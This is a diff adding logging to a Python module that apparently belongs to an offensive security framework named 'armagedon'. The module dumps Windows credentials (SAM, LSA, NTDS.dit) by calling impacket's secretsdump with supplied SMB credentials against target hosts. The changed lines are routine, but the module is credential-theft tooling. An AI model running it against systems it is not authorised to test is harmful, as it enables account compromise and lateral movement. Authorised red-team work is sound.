@@ -7,7 +7,10 @@ using secretsdump (SAM, LSA, NTDS.dit) and mimikatz-like techniques.
 import subprocess
 import shutil
 import re
+import logging
 import os
+
+log = logging.getLogger("armagedon.modules.post.credential_dump")
 
 # ── SAFETY NOTE ─────────────────────────────────────────────────────────
 # This module is READ-ONLY on the target system. It reads credential
@@ -29,6 +32,8 @@ def run(options=None, target=None, mode="CHECK", **kwargs):
     smb_domain = options.get("SMB_DOMAIN", "")
     output_dir = options.get("OUTPUT_DIR", "/tmp/armagedon_creds")
 
+    log.info(f"Credential dump run against {rhosts} mode={mode}")
+
     result = {
         "success": False,
         "technique": NAME,
@@ -40,11 +45,13 @@ def run(options=None, target=None, mode="CHECK", **kwargs):
 
     if not rhosts or not smb_user or not smb_pass:
         result["error"] = "RHOSTS, SMB_USER, SMB_PASS required"
+        log.error(result["error"])
         return result
 
     cmd = shutil.which("impacket-secretsdump") or shutil.which("secretsdump.py")
     if not cmd:
         result["error"] = "impacket-secretsdump not found"
+        log.error(result["error"])
         return result
 
     auth = f"{smb_domain}/{smb_user}:{smb_pass}" if smb_domain else f"{smb_user}:{smb_pass}"
